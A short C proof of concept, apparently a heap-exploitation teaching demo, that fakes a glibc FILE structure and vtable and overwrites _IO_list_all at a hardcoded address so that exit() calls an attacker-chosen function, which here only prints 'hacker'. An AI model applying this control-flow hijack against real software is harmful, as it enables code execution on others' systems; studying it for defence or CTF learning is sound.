#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define write_ptr_offset 0x28
#define write_base_offset 0x20
#define vtable_offset 0xd8

void func(){
    printf("hacker\n");
}

int main(void)
{
    void *ptr;
    long long *list_all_ptr;

    ptr=malloc(0x200);

    *(long long*)((long long)ptr+mode_offset) = 0x0;
    *(long long*)((long long)ptr+write_ptr_offset) = 0x1;
    *(long long*)((long long)ptr+write_base_offset) = 0x0;
    *(long long*)((long long)ptr+vtable_offset) = ((long long)ptr+0x100);

    *(long long*)((long long)ptr+0x100+24) = (long long)func;

    list_all_ptr = (long long *)_IO_list_all;
    printf("list_all_ptr[0]:%p\n", list_all_ptr[0]);
    list_all_ptr[0] = ptr;
    printf("ptr:%p\n", ptr);
    printf("list_all_ptr[0]:%p\n", list_all_ptr[0]);
    exit(0);
    return 0;
}
